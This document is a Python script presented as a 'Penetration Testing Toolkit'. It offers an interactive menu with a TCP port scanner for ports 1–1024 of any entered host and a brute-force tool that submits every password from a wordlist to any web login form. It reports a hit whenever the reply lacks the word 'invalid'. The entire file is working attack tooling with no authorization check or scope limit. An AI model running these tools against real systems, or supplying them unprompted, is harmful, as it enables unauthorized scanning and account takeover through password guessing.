import socket
import requests

def scan_ports(target, ports):
    print(f"[*] Scanning {target} for open ports...")
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except Exception as e:
            print(f"[!] Error scanning port {port}: {e}")
    return open_ports

def brute_force_login(url, username_field, password_field, username, password_list):
    print(f"[*] Starting brute-force attack on {url} with username '{username}'")
    for password in password_list:
        password = password.strip()
        data = {username_field: username, password_field: password}
        try:
            response = requests.post(url, data=data, timeout=5)
            if "invalid" not in response.text.lower():
                print(f"[+] Success! Password found: {password}")
                return password
            else:
                print(f"[-] Failed attempt: {password}")
        except Exception as e:
            print(f"[!] Error during request: {e}")
    print("[-] Brute-force failed.")
    return None

def main():
    print("\nüõ†Ô∏è Penetration Testing Toolkit\n")
    print("1. Port Scanner")
    print("2. Brute Force Login")
    choice = input("Choose an option (1 or 2): ")

    if choice == '1':
        target = input("Enter target IP or domain: ")
        ports = range(1, 1025)
        open_ports = scan_ports(target, ports)
        print(f"[+] Open ports on {target}: {open_ports}")

    elif choice == '2':
        url = input("Enter login form URL: ")
        username = input("Enter username: ")
        username_field = input("Enter username field name (e.g., 'username'): ")
        password_field = input("Enter password field name (e.g., 'password'): ")
        pass_file = input("Enter path to password list (e.g., passwords.txt): ")

        try:
            with open(pass_file, "r") as f:
                passwords = f.readlines()
            brute_force_login(url, username_field, password_field, username, passwords)
        except FileNotFoundError:
            print(f"[!] File not found: {pass_file}")
    else:
        print("Invalid option selected.")

if __name__ == "__main__":
    main()
